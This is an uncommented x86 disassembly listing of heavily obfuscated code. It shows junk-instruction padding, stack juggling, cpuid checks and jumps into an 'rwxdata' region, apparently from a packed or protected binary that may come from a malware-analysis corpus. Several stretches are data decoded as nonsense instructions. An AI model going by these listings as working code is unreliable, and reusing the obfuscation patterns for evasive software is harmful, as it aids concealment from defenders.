sub_247105
sar ch cl
mov ecx edi
shl si cl
sbb esi 0x747e9e0e
sub ecx ebx
neg si
pushfd
test dh 0x6a
pushad
lea esi [ esp + 0x2c ]
jmp rwxdata
sub edi 0x4
pushfd
test ch 0x80
push [ edi ]
pop [ esp + 0x2c ]
clc
cmc
cmp edi ebx
mov [ esp ] 0xfa
pushfd
push [ esp ]
mov [ esp ] cl
lea esp [ esp + 0x34 ]
ja rwxdata
cmc
cmc
sub edi 0x4
cmc
test al cl
push [ edi ]
stc
stc
stc
cmp edi ebx
pushfd
push 0x527ea9cf
call sub_4d557e
call sub_4de546
pushad
dec al
neg al
inc al
sub ebx edi
add edi 0x21ef5d81
movzx edi bl
xor edi 0xf1a104ba
add edi eax
sub esp 0xffffffe0
add ebx esp
inc al
shld di cx cl
mov edi ebx
push 0x99353bd1
mov al 0x2e
push eax
call sub_24b274
clc
cmp [ edi ] 0x23
call sub_4d4d54
clc
mov [ esp ] 0x84
xor eax eax
add esp 0x4
jmp rwxdata
or ebx ebx
jmp sub_4da277
sub_247290
movzx cx cl
pushfd
mov ecx [ esp + 0x38 ]
push [ esp ]
push [ esp + 0x4 ]
jmp rwxdata
jmp rwxdata
mov esp ebp
pushfd
lea ebp [ ecx * 2 - 0x1711967 ]
lea ebp [ ecx * 8 - 0x32b07e6 ]
pushfd
mov ebp [ esp + 0x8 ]
push ecx
pushad
push [ esp + 0x30 ]
retn 0x44
sub_2472a5
add edi 0x1
or al 0x6
rcl al 0x7
mov al [ edi ]
bt dx 0xd
mov [ esp + 0x8 ] bl
cmc
test al al
push 0x3c509738
jmp rwxdata
jmp rwxdata
lea esp [ esp + 0x28 ]
je rwxdata
setle cl
rol cl cl
stc
btr cx 0x3
mov edi edx
ror al 0x6
rcl al 0x2
movzx cx cl
mov ecx edi
not al
setae al
mov al [ ecx ]
jmp rwxdata
bt eax 0x1d
call sub_4d6b3e
jo rwxdata
pushad
mov [ esp ] dh
mov ah al
stc
clc
call sub_24b6e8
pushad
mov [ esp + 0x1c ] 0x2004961e
push esi
mov [ esp + 0x1c ] 0x81352a5a
pushfd
push [ esp ]
mov [ esp ] cl
mov [ esp + 0x4 ] 0x24ad71ac
lea esp [ esp + 0x24 ]
jmp rwxdata
bt cx bp
mov [ ebp - 0x8 ] 0x0
dec cx
inc ch
shr cx 0x4
add cl ah
mov ecx [ edx + 0x18 ]
pushfd
cmp ecx [ ebp - 0x8 ]
call sub_4d4845
bound edx [ ecx - 0x4e2b9e6e ]
add al 0x6e
test [ eax + 0x1331ac37 ] ecx
into
arpl [ edi ] cx
jecxz rwxdata
pushad
pushad
mov [ esp + 0x3c ] ecx
jmp rwxdata
or bp 0x3e
mov ch 0xa2
push ecx
ficom [ 0x648da09e ]
pop esp
jg rwxdata
dec esi
jecxz rwxdata
pushfd
mov [ esp + 0x3c ] ebp
call sub_51137f
retn
inc ebx
push cs
leave
sub_2472c5
push esp
pushfd
lea esp [ esp + 0x14 ]
ja rwxdata
pushad
mov [ esp + 0xc ] cx
mov esp esi
pushad
pushad
pushfd
push ebp
lea esp [ esp + 0x48 ]
jmp rwxdata
pushad
clc
clc
cmc
imul edx edx 0xa
pushfd
pushad
test cx bp
cmc
add edx eax
mov [ esp ] 0xbf19
pushfd
push edi
lea esp [ esp + 0x4c ]
jmp sub_4db31d
bswap edx
sub dx cx
xor eax eax
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
sub_2493e2
clc
bt dx 0xb
pushad
add ecx 0xffffffff
call sub_5111f7
inc esi
mov [ esp ] bl
pushfd
pushfd
adc dl dl
pushfd
mov [ esp ] cl
push [ esp + 0x50 ]
retn 0x54
sub_249877
lea esp [ esp + 0x4 ]
jae rwxdata
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
clc
call sub_4fe866
sub_249887
stc
adc si 0x9ca8
mov ecx edi
shr si cl
sar si cl
sub ecx ebx
adc si 0x3aef
lea esi [ esp + 0x4 ]
bt bx 0x2
stc
sub edi 0x4
test cl bl
bt ax 0x7
push [ edi ]
pop [ esp ]
bt si 0xc
push ebx
cmp edi ebx
jmp rwxdata
push 0xa23d1735
lea esp [ esp + 0x8 ]
ja rwxdata
cmc
cmc
sub edi 0x4
cmc
test al cl
push [ edi ]
stc
stc
stc
cmp edi ebx
pushfd
push 0x527ea9cf
call sub_4d557e
call sub_4de546
xor al cl
pushfd
sub ebx edi
call sub_4dae01
sub_249977
mov esp esi
pushad
pushfd
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
sub_249986
movzx esi cl
mov esi [ esp + 0x30 ]
pushfd
lea esp [ esp + 0x38 ]
jmp rwxdata
pushfd
call sub_4fd3de
sub [ ecx ] al
scasb [ edi ]
nop
and [ ebx ] esp
or al [ ecx - 0x5c ]
lea ebp [ esp + edi * 4 + 0x2f5c6dff ]
xor bh al
sub_2499a2
pushad
jmp rwxdata
jmp rwxdata
lea esp [ esp + 0x20 ]
ja rwxdata
pushad
mov [ esp + 0xc ] cx
mov esp esi
pushad
pushad
pushfd
push ebp
lea esp [ esp + 0x48 ]
jmp rwxdata
stc
imul edx edx 0xa
jns rwxdata
bswap edx
sub dx cx
xor eax eax
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
cmp bp bp
stc
cmc
test al dl
add edx eax
pushfd
mov [ esp ] esi
pushfd
push ebx
lea esp [ esp + 0xc ]
jmp sub_4db31d
cmp cl bh
add edx eax
pushad
lea esp [ esp + 0x20 ]
jmp sub_4db31d
sub_249b8d
pushfd
push ebp
lea esp [ esp + 0x38 ]
jbe rwxdata
bswap edx
sub dx cx
xor eax eax
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
or di 0xf631
cmp sp 0xe969
sub ecx 0x1
test ah 0x38
btc si bx
mov [ ebp - 0x4 ] ecx
shrd ecx edx 0xc
stc
shl di 0xf
pushad
mov ecx [ ebp - 0x8 ]
shl si cl
add ecx [ ebp - 0x4 ]
btc esi 0x3
shr ecx 0x1
rcl esi cl
shl si cl
mov edi [ ebx + ecx * 4 ]
inc si
bsf si bx
rcr esi 0x4
bsr esi eax
add edi eax
pop esi
mov esi [ ebp + 0xc ]
push 0x2d05f808
mov [ esp ] 0x60
push 0x6b168c9d
mov [ esp + 0x20 ] eax
setns al
setl al
lodsb [ esi ]
jmp rwxdata
cmc
test sp 0x6b35
neg al
jmp sub_4d535c
sub_24a3f3
mov esp ebp
jle rwxdata
bswap bp
jmp rwxdata
lea ebp [ esi - 0x2e027073 ]
bswap bp
pop ebp
push ecx
push [ esp + 0x4 ]
retn 0x10
push esi
mov ebp [ esp + 0x4 ]
push 0xb7a2de15
pushad
push [ esp + 0x2c ]
retn 0x38
sub_24a551
pushfd
mov [ esp + 0x4 ] 0xc1796ae8
lea esp [ esp + 0x18 ]
jne rwxdata
pushad
mov [ esp + 0xc ] cx
mov esp esi
pushad
pushad
pushfd
push ebp
lea esp [ esp + 0x48 ]
jmp rwxdata
jmp rwxdata
bswap edx
sub dx cx
xor eax eax
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
mov [ edi - 0x1 ] 0x0
not eax
push ebx
pushfd
jmp rwxdata
jmp rwxdata
mov [ esp ] sp
lea eax [ rwxdata ]
pushad
push 0x57864fdd
call sub_4d73ad
lea ebp [ esi + 0x12e3668f ]
0xae18
sub_24a695
pushfd
push 0x613d5695
and [ ebx ] ch
sbb [ ebx + ebx * 8 + 0x7b52df08 ] bl
and eax [ ebx ]
jpe rwxdata
sahf
and ebp 0xfc2fb5b8
leave
daa

clc
aam 0xfc
scasd [ edi ]
ficom [ edi + 0x75 ]
js rwxdata
salc
inc esi
cdq
cmp [ edi + ebx * 8 - 0x67 ] esi
lodsd [ esi ]
in al 0xa5
in eax dx
or esi edx
sub esp ecx
out dx eax
xlat
sbb eax 0xeed4df1a
out 0x4c al
add edi eax
clc
call sub_4d56e3
add esp edx
mov dl 0x4e
mov eax [ 0x5294469e ]
adc al 0x16
in eax dx
popfd
mov al 0x36
scasb [ edi ]
jne rwxdata
popad
in eax dx
dec ecx
sbb [ 0x56d9 ] 0x6a
xchg edx eax
shl [ edi ] 0x1
xchg ecx eax
inc ecx
movsb [ edi ] [ esi ]
mov ebx 0x82486252
cmp eax 0xaac23312
inc esi
iretd
sub_24a8e8
lea esp [ esp + 0x14 ]
je rwxdata
push eax
jmp rwxdata
mov si bp
mov di si
jmp rwxdata
clc
mov [ esp ] 0x84
xor eax eax
add esp 0x4
lea edx [ ebx + 0x4 ]
pushad
pop esi
movzx esi [ edx + 0x1a ]
movzx di al
lea esi [ esi + edx + 0x1c ]
movzx di dl
movsx di cl
lea edi [ ebp - 0x2fa598c ]
mov edi [ ebp + 0x8 ]
mov [ esp + 0x4 ] 0x81
jmp rwxdata
or ebx ebx
jmp sub_4da277
pushad
lea esp [ esp + 0x3c ]
call sub_4dd2bf
jmp rwxdata
jne rwxdata
call sub_2493e2
lea eax [ esp - 0x75c90542 ]
pushfd
mov eax [ edx + 0x8 ]
pushad
mov [ esp + 0x4 ] bl
mov [ esp ] 0x86
lea esp [ esp + 0x24 ]
jmp rwxdata
jmp rwxdata
sub_24a942
pushfd
inc ecx
mov al al
pushad
not al
mov al 0x10
pushfd
push esi
push edx
push esp
lea esp [ esp + 0x40 ]
call sub_24a185
call sub_4fea63
push eax
sub_24aa45
push 0xaf97c0d6
add dl dl
mov [ esp ] ch
pushfd
lea esp [ esp + 0x8 ]
jne rwxdata
pushad
push [ esp + 0x20 ]
retn 0x24
pushfd
push 0x5acd4785
lea esp [ esp + 0x8 ]
jo rwxdata
jmp sub_4dd074
pushf
not dl
stc
not dl
mov dl [ esi ]
jmp rwxdata
rol dl 0x7
clc
clc
test dl 0xe8
add dl 0x0
jmp rwxdata
not dl
stc
test dx 0x3fba
call sub_24abec
sub_24aa78
push [ esp + 0xc ]
lea esp [ esp + 0x14 ]
jbe rwxdata
bswap edx
sub dx cx
xor eax eax
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
inc si
sub ecx 0x1
neg si
cmc
inc di
cmp sp 0xa0ba
mov [ ebp - 0x4 ] ecx
bsf si bx
rcl cl cl
btc cx di
mov ecx [ ebp - 0x8 ]
adc esi 0xb7af304d
cmc
add ecx [ ebp - 0x4 ]
shl di 0x5
shld di bx cl
shl di 0xe
shr ecx 0x1
rol si 0xb
bsr si si
xadd di si
bts di sp
mov edi [ ebx + ecx * 4 ]
stc
add edi eax
bswap si
mov esi [ ebp + 0xc ]
call sub_4d6231
push esi
popfd
and ch [ edx + 0x3801e0ec ]
sti
vandpd ymm1 ymm2 [ ecx ]
mov eax 0x3a19ea75
leave
dec edx
mov ecx 0xdd2615d9
salc
js rwxdata
test [ ecx - 0x20cf4a64 ] esi
and eax 0xbd4072a3
sbb [ ebx ] bh
iretd
int3
sub_24abec
sub dl 0x34
test al 0x97
push [ esp ]
push 0x9ad1d287
pushad
push [ esp + 0x2c ]
popf
lea esp [ esp + 0x2e ]
jo rwxdata
pushad
inc esi
lea esp [ esp + 0x20 ]
jge rwxdata
pushad
pushfd
pushad
inc esi
pushfd
call sub_4fee7c
call sub_4db88c
xlat
fstp [ esi + 0x5e ]
ficomp [ ecx - 0x27 ]
adc bl [ edi - 0x64 ]
push ebp
and [ eax - 0x78 ] 0x34
and al 0x88
push edx
adc dl dl
mov [ esp ] 0x782c
push 0xff6a15d6
push [ esp + 0x8 ]
retn 0xc
adc dl dl
pushad
push ebx
push [ esp + 0x24 ]
retn 0x28
sub_24add3
mov bl 0x2
pushad
inc al
call sub_24b266
pushad
push 0x1f52108f
bswap ax
push [ ebp - 0x4 ]
pop [ esp + 0x28 ]
bswap ax
mov [ esp + 0x24 ] ebx
lea eax [ ebp * 2 - 0x6ddb6136 ]
movzx ax cl
movzx ax bl
movzx ax bl
mov [ esp + 0x20 ] 0xb
lahf
lea eax [ rwxdata ]
mov [ esp ] ah
pushad
mov [ esp + 0x3c ] rwxdata
pushfd
pushfd
jmp rwxdata
push [ eax ]
pop [ esp + 0x40 ]
pushfd
pushfd
mov [ esp + 0x8 ] bh
mov [ esp + 0x8 ] dl
push [ esp + 0x48 ]
retn 0x4c
sub_24ae29
mov [ esp ] dl
mov edi [ edi + ecx * 4 ]
pushad
mov [ esp ] 0xc376
mov [ esp + 0x4 ] bl
test edi edi
pushad
lea esp [ esp + 0x44 ]
je rwxdata
bswap edx
sub dx cx
xor eax eax
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
bt bx 0x1
pushfd
add eax edi
pushad
bt sp cx
pushad
test bp 0xbe7f
cmp eax edx
call sub_24be15
mov [ esp + 0x1c ] edi
bswap di
clc
pushad
mov [ esp + 0x38 ] ebx
adc edi ebp
push [ esp ]
mov esi [ esp + 0x50 ]
xchg al dl
cmp bl dh
mov edi [ esp + 0x54 ]
inc dl
mov dl 0x80
mov [ esp ] bh
clc
xor ebx ebx
lea esp [ esp + 0x3c ]
call sub_249ac5
sub_24b33a
pushfd
add ecx edx
jmp rwxdata
pushfd
cmp sp dx
mov [ ebp - 0x10 ] ecx
sub cx 0xa6e8
mov ecx [ ebp + 0xc ]
cmp bh 0x5e
cmp ecx 0xffff
mov [ esp + 0xc ] bl
pushad
pushfd
lea esp [ esp + 0x34 ]
jbe rwxdata
pushfd
test ah 0x5a
sub ecx [ edx + 0x10 ]
call j_sub_24c1b3
cmp edi [ edx - 0x11e8fd12 ]
push ebx
jl rwxdata
or bl bh
push esi
bt bx bx
btr cx dx
mov edi [ edx + 0x24 ]
xchg bx cx
add edi eax
shl bh cl
not bh
not bl
cmc
mov ebx [ edx + 0x20 ]
cmp ch 0x44
add cl 0xda
pushad
shrd cx di cl
add ebx eax
dec ecx
jmp rwxdata
pop edx
test eax 0x919c49ba
sahf
push ebp
into
and eax 0xf944816d
mov ebp 0x38b89631
xchg [ esp + ebx * 2 - 0x56 ] ch
dec eax
test dl dl
int 0x10
neg [ ebp + 0x43c7173 ]
enter 0xb254 0x8f
loopne rwxdata
and eax 0xa1348d88
0x220df669 0x5ad1
mov [ ebp - 0x8 ] 0x0
bsf ecx edi
or cl 0x3b
pushfd
mov ecx [ edx + 0x18 ]
pushfd
cmp ecx [ ebp - 0x8 ]
jmp rwxdata
cmp [ esp + ebp * 8 - 0x11064164 ] 0xea
mov [ 0xffffffff9830f048 ] al
and ebp [ edx + ebx * 8 + 0x5e ]
ja rwxdata
int3
call sub_249b8d
push 0x6a295e43
inc eax
fiadd [ esp + esi * 4 ]
aad 0x10
mov ch 0x7c
mov al 0x43
mov ebx cr3
add al 0xa2
inc eax
retn
sub_24b5c7
jmp rwxdata
stosb [ edi ]
pushfd
mov [ esp + 0x4 ] di
pushfd
lea esp [ esp + 0x2c ]
jmp rwxdata
pushfd
call sub_4fd3de
sub [ ecx ] al
scasb [ edi ]
nop
and [ ebx ] esp
or al [ ecx - 0x5c ]
lea ebp [ esp + edi * 4 + 0x2f5c6dff ]
xor bh al
sub_24b604
pushad
pushfd
test dl 0x91
cmp ebx 0x1
call j_sub_5110df
jl rwxdata
add [ ecx - 0x51 ] ecx
daa
rol [ ecx + 0x40 ] 0xe2
xchg ebp eax
les esi [ ebx ]
sbb al 0xeb
jecxz rwxdata
push edx
0x60be
lds esi [ fs : esi ]
sbb dl [ edx + 0x33 ]
xor eax [ esi + 0x57 ]
stc
add esp eax
pop ebx
xchg edx eax
push ebp
retn 0x3936
xchg [ esi ] ah
and [ ecx + edi * 8 + 0x8 ] edx
adc eax esp
stc
pop ebx
call 0xffffffffdeb7664b
out 0x12 eax
jecxz rwxdata
inc ecx
inc eax
loop rwxdata
pop ecx
cli
inc ecx
or [ esi - 0x69be003e ] bl
stosd [ edi ]
pop edx
[ eax ] edx
mov bl 0xb
fldenv [ esi ]
push ecx
xchg ecx eax
test al al
call sub_4dc222
adc dh [ ebp + 0x6112f8a ]
std
inc esi
mov ebp 0x2f1d1c32
jb rwxdata
scasb [ edi ]
outsd
xchg edx eax
loope rwxdata
sub_24b6e8
rol al 0x6
pushfd
pushfd
not al
bt ax 0xd
test cx di
test dh bh
neg al
call sub_4dda8b
push [ esp + 0x4 ]
lea esp [ esp + 0xc ]
je rwxdata
setle cl
rol cl cl
stc
btr cx 0x3
mov edi edx
ror al 0x6
rcl al 0x2
movzx cx cl
mov ecx edi
not al
setae al
mov al [ ecx ]
jmp rwxdata
jmp sub_24c1e5
pushad
mov [ esp ] dh
mov ah al
stc
clc
call sub_24b6e8
pushad
mov [ esp + 0x1c ] 0x2004961e
push esi
mov [ esp + 0x1c ] 0x81352a5a
pushfd
push [ esp ]
mov [ esp ] cl
mov [ esp + 0x4 ] 0x24ad71ac
lea esp [ esp + 0x24 ]
jmp rwxdata
pushad
pushad
mov [ esp + 0x3c ] ecx
jmp rwxdata
pushfd
mov [ esp + 0x3c ] ebp
call sub_51137f
sub_24b974
bsf esi esi
call sub_247105
inc ebx
pop es
xor [ eax ] eax
add [ eax ] al
add [ eax ] al
mov eax [ 0x2dd4 ]
add [ eax ] al
add [ ecx ] cl
outsb
sub eax 0x2de1b800
add [ eax ] al
add [ eax ] al
add [ eax ] ah
sub eax 0x0
add [ ebp - 0x5a ] bh
add al 0x0
add [ eax ] al
add [ eax ] al
clc
sub eax 0x0
add [ esi + 0x471 ] al
add [ eax ] al
add [ eax + esi + 0x2d ] bh
add [ eax ] al
add [ eax ] al
add [ esi + eax + 0x31 ] bl
add [ eax ] al
popfd
0x48360004 0x2d
push ebx
sub [ 0x2fe68000 ] 0x2dd72100
add [ edi + 0x7c ] dh
sub eax 0x0
add [ eax + esi ] ch
mov [ esp ] dx
cmp al 0x9
pushfd
call sub_2472c5
lea esp [ esp + 0xc ]
jne rwxdata
test ah 0x6d
js rwxdata
pushad
call sub_24b5c7
xor al 0x7c
stc
jmp rwxdata
call sub_4d786c
clc
push esi
bsf si si
shrd si cx 0x5
mov esi edi
stc
stc
call sub_4d7c9a
lea esp [ esp + 0x28 ]
jne rwxdata
neg al
stc
push [ esp + 0x4 ]
not al
mov [ esp + 0x4 ] 0x14
stc
push [ esp ]
ror al 0x6
jmp rwxdata
ror al 0x6
rcl al 0x2
movzx cx cl
mov ecx edi
not al
setae al
mov al [ ecx ]
jmp rwxdata
bsr ax di
mov ax 0x336e
bsr ax dx
sub edx edx
shr ax 0x9
and eax 0xc565c013
adc al ch
bt bx di
mov eax edx
push edx
test ax 0x731d
add edi 0x1
or al dl
add al ch
setbe al
mov al [ edi ]
cmc
cmp cl cl
jmp rwxdata
cmp al [ edi ]
pushfd
movsx ax al
lea esp [ esp + 0x40 ]
jge rwxdata
pushad
mov [ esp ] dh
mov ah al
stc
clc
call sub_24b6e8
pushad
mov [ esp + 0x1c ] 0x2004961e
push esi
mov [ esp + 0x1c ] 0x81352a5a
pushfd
push [ esp ]
mov [ esp ] cl
mov [ esp + 0x4 ] 0x24ad71ac
lea esp [ esp + 0x24 ]
jmp rwxdata
test al al
call sub_4dc222
jmp rwxdata
lea edi [ edi + 0x1 ]
push ebp
movsx ax cl
pushfd
lea esp [ esp + 0x8 ]
jl rwxdata
pushad
pushad
mov [ esp + 0x3c ] ecx
jmp rwxdata
lahf
cwde
lea edi [ edi + 0x1 ]
movzx eax bl
movsx ax dl
not al
jmp rwxdata
call sub_4fdafa
pop eax
pushfd
lea esp [ esp + 0x4 ]
ja rwxdata
pushfd
mov [ esp + 0x3c ] ebp
call sub_51137f
pop eax
pushad
jmp rwxdata
cmc
call sub_4fea6f
mov [ esp + 0x24 ] 0x47586ff8
push [ esp + 0x4 ]
mov [ esp + 0x4 ] 0x71
pushfd
push eax
lea esp [ esp + 0x30 ]
jmp rwxdata
call sub_4d4aeb
mov [ esp ] 0x4c048460
call sub_24a47c
push eax
lea esp [ esp + 0x20 ]
ja rwxdata
pushfd
pushad
mov [ esp + 0x8 ] sp
mov [ esp + 0x20 ] ecx
call sub_512539
pushad
pushfd
pushfd
mov [ esp + 0x4 ] 0x561c
lea esp [ esp + 0x28 ]
jb rwxdata
jmp rwxdata
cmp ch 0x18
stc
cmp [ edi - 0x1 ] 0x0
pushad
lea esp [ esp + 0x20 ]
jne rwxdata
cmp ecx [ ebp - 0x8 ]
jmp rwxdata
push 0x7bd1062d
pushad
call sub_4dd10a
call sub_51040d
mov ch 0x76
shl [ edx ] cl
sub ebx edx
leave
xchg ecx eax
adc cl [ esi - 0x62 ]
pop ebp
in al 0x79
dec edx
hlt
dec di
shrd di cx cl
mov edi [ edx + 0x24 ]
jmp rwxdata
pushfd
lea esp [ esp + 0x4 ]
jbe rwxdata
stc
cmp ch ah
add edi eax
clc
pushad
cmp bl bh
movzx ecx [ edi + ecx * 2 ]
and edi ecx
call sub_24a46c
bswap edx
sub dx cx
xor eax eax
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
ror di 0xe
lea edi [ 0xfffffffff59e35a9 ]
shr di 0xd
pushad
sub ecx 0x1
sub si cx
push ecx
bts di ax
mov [ ebp - 0x4 ] ecx
sub esp 0xffffffdc
shrd cx ax 0x6
not di
add esi 0x9f840703
mov ecx [ ebp - 0x8 ]
xadd si di
sar di 0xc
bts edi eax
add ecx [ ebp - 0x4 ]
pushfd
btr si si
not di
shr ecx 0x1
lea edi [ edx - 0x25f4a10 ]
bswap di
movsx di dl
stc
mov edi [ ebx + ecx * 4 ]
bsf si cx
bsf esi ebp
or si 0xe2a8
add edi eax
push [ esp ]
not esi
pop esi
pop esi
mov esi [ ebp + 0xc ]
sub_24b9f2
lea esp [ esp + 0xc ]
jne rwxdata
test ah 0x6d
js rwxdata
pushad
call sub_24b5c7
xor al 0x7c
stc
jmp rwxdata
call sub_4d786c
clc
push esi
bsf si si
shrd si cx 0x5
mov esi edi
stc
stc
call sub_4d7c9a
lea esp [ esp + 0x28 ]
jne rwxdata
neg al
stc
push [ esp + 0x4 ]
not al
mov [ esp + 0x4 ] 0x14
stc
push [ esp ]
ror al 0x6
jmp rwxdata
ror al 0x6
rcl al 0x2
movzx cx cl
mov ecx edi
not al
setae al
mov al [ ecx ]
jmp rwxdata
bsr ax di
mov ax 0x336e
bsr ax dx
sub edx edx
shr ax 0x9
and eax 0xc565c013
adc al ch
bt bx di
mov eax edx
push edx
test ax 0x731d
add edi 0x1
or al dl
add al ch
setbe al
mov al [ edi ]
cmc
cmp cl cl
jmp rwxdata
cmp al [ edi ]
pushfd
movsx ax al
lea esp [ esp + 0x40 ]
jge rwxdata
pushad
mov [ esp ] dh
mov ah al
stc
clc
call sub_24b6e8
pushad
mov [ esp + 0x1c ] 0x2004961e
push esi
mov [ esp + 0x1c ] 0x81352a5a
pushfd
push [ esp ]
mov [ esp ] cl
mov [ esp + 0x4 ] 0x24ad71ac
lea esp [ esp + 0x24 ]
jmp rwxdata
test al al
call sub_4dc222
jmp rwxdata
lea edi [ edi + 0x1 ]
push ebp
movsx ax cl
pushfd
lea esp [ esp + 0x8 ]
jl rwxdata
pushad
pushad
mov [ esp + 0x3c ] ecx
jmp rwxdata
lahf
cwde
lea edi [ edi + 0x1 ]
movzx eax bl
movsx ax dl
not al
jmp rwxdata
call sub_4fdafa
pop eax
pushfd
lea esp [ esp + 0x4 ]
ja rwxdata
pushfd
mov [ esp + 0x3c ] ebp
call sub_51137f
pop eax
pushad
jmp rwxdata
cmc
call sub_4fea6f
mov [ esp + 0x24 ] 0x47586ff8
push [ esp + 0x4 ]
mov [ esp + 0x4 ] 0x71
pushfd
push eax
lea esp [ esp + 0x30 ]
jmp rwxdata
call sub_4d4aeb
mov [ esp ] 0x4c048460
call sub_24a47c
push eax
lea esp [ esp + 0x20 ]
ja rwxdata
pushfd
pushad
mov [ esp + 0x8 ] sp
mov [ esp + 0x20 ] ecx
call sub_512539
pushad
pushfd
pushfd
mov [ esp + 0x4 ] 0x561c
lea esp [ esp + 0x28 ]
jb rwxdata
jmp rwxdata
cmp ch 0x18
stc
cmp [ edi - 0x1 ] 0x0
pushad
lea esp [ esp + 0x20 ]
jne rwxdata
cmp ecx [ ebp - 0x8 ]
jmp rwxdata
push 0x7bd1062d
pushad
call sub_4dd10a
call sub_51040d
mov ch 0x76
shl [ edx ] cl
sub ebx edx
leave
xchg ecx eax
adc cl [ esi - 0x62 ]
pop ebp
in al 0x79
dec edx
hlt
dec di
shrd di cx cl
mov edi [ edx + 0x24 ]
jmp rwxdata
pushfd
lea esp [ esp + 0x4 ]
jbe rwxdata
stc
cmp ch ah
add edi eax
clc
pushad
cmp bl bh
movzx ecx [ edi + ecx * 2 ]
and edi ecx
call sub_24a46c
bswap edx
sub dx cx
xor eax eax
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
ror di 0xe
lea edi [ 0xfffffffff59e35a9 ]
shr di 0xd
pushad
sub ecx 0x1
sub si cx
push ecx
bts di ax
mov [ ebp - 0x4 ] ecx
sub esp 0xffffffdc
shrd cx ax 0x6
not di
add esi 0x9f840703
mov ecx [ ebp - 0x8 ]
xadd si di
sar di 0xc
bts edi eax
add ecx [ ebp - 0x4 ]
pushfd
btr si si
not di
shr ecx 0x1
lea edi [ edx - 0x25f4a10 ]
bswap di
movsx di dl
stc
mov edi [ ebx + ecx * 4 ]
bsf si cx
bsf esi ebp
or si 0xe2a8
add edi eax
push [ esp ]
not esi
pop esi
pop esi
mov esi [ ebp + 0xc ]
sub_24ba0a
mov al 0x33
pushad
call sub_4fe898
pushfd
push esp
mov [ esp ] 0x490402c9
push 0x5a040ce
push esi
mov [ esp ] 0xaae24f2a
mov [ esp + 0x4 ] 0xa88be8ca
mov [ esp ] sp
pushfd
mov [ esp ] dl
pushfd
lea esp [ esp + 0xc ]
jmp rwxdata
call sub_513189
pushfd
lea eax [ ebx + 0x34ef2c89 ]
mov ax 0x7fca
pushad
mov [ esp + 0x20 ] ebx
pushad
mov eax [ ebp ]
jmp rwxdata
push edx
lea esp [ esp + 0x44 ]
jle rwxdata
push 0x58775ba6
lea esp [ esp + 0x4 ]
cpuid
bt eax 0x13
call sub_513c82
cpuid
jmp rwxdata
jmp rwxdata
bt cx dx
sub ebp 0xc
call sub_514229
sub_24bb10
mov [ esp + 0x4 ] 0x93ea
clc
ror al 0x6
cmc
cmc
cmp al [ edi ]
setg al
call sub_4d2d07
mov ah 0x33
sub bh bl
in al dx
push esi
xchg [ edi - 0x606d7cbe ] ah
xchg ebp eax
les edi [ ebx + 0x68 ]
or al 0xe0
jmp 0xffffffffb80021a9
sub_24bbe8
push esi
jmp rwxdata
lea esp [ esp + 0xc ]
jne rwxdata
pushad
mov [ esp + 0xc ] cx
mov esp esi
pushad
pushad
pushfd
push ebp
lea esp [ esp + 0x48 ]
jmp rwxdata
cwde
mov [ edi - 0x1 ] 0x0
movsx ax bl
cwde
push ebx
cwde
call sub_4d5333
mov bx 0x3420
bswap bx
btc bx 0xa
ror bl cl
mov ebx eax
stc
cmp [ edi ] 0x23
pushfd
jmp sub_4de1d2
bswap edx
sub dx cx
xor eax eax
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
sub_24bd45
mov [ esp ] ax
lea esp [ esp + 0x50 ]
je rwxdata
bswap edx
sub dx cx
xor eax eax
cmc
pushfd
bt ax cx
pushad
add eax edi
bt edx ebp
cmp eax edx
jmp rwxdata
mov [ esp + 0x8 ] si
lea esp [ esp + 0x24 ]
jb rwxdata
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
stc
call sub_4d33c7
pop ss
ficom [ edi - 0x52 ]
xor [ edx + 0x76 ] 0x10
sub_24be15
lea esp [ esp + 0x48 ]
jb rwxdata
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
cmp cl 0xfa
test ch dh
cmp eax [ ebp - 0x10 ]
jmp rwxdata
pushfd
lea esp [ esp + 0x4 ]
jae rwxdata
xchg bx di
sete bh
movzx di bl
call sub_4dd56d
or eax 0x5fc2332e
xchg esi eax
cmp bl [ ebx - 0x62 ]
xchg ebx eax
sti
shl [ ebx + 0x1403d66b ] 0xe3
dec eax
